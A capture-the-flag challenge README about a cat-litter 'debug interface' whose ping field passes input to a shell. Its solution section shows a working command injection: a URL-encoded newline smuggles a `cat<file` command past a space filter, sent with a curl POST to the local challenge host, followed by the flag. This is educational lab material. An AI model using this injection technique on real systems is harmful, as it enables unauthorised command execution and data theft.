# Chall

### 📄 Description
Damn it, that stupid smart cat litter is broken again.
Now only the debug interface is available here and this stupid thing only permits one ping to be sent!
I know my contract number is stored somewhere on that interface but I can't find it and this is the only available page! Please have a look and get this info for me!

FYI No need to bruteforce anything there. If you do you'll be banned permanently.

We suggest to use "curl" for communicating with the host. 


### ⚙ How to run it
Be sure that the the entire folder has the right permissions.
To do it, open the terminal and write:
```bash
chmod -R +rx ./
```

To execute the exercise, do the following on the terminal:
```bash
sudo docker-compose up
```

### ⛔ Rules
You don't have access to `data` folder.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
    
* after a couple tries it becomes obvious that the input is passed to a shell but is more or less sanitized
* `%0a` (=> `\n`) isn't prohibited
* ` ` (space) is tho
* we can run `ls` in pwd but we can't check subfolders
* `find` to the rescue (if called without parameters it recursively lists directory starting from pwd)
* looks like the flag is in `./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag`
* we can't just `cat` it
* after some quick googling we should be able to do `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag`

<h3> 🚩 Flag </h3>

```
INS{warm_kitty_smelly_kitty_flush_flush_flush}
```
obtained by running `curl -s 'http://localhost:8090/index.cgi' -X POST --data-raw "dest=%0acat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag" | xidel -se "/html/body/pre" -`

</details>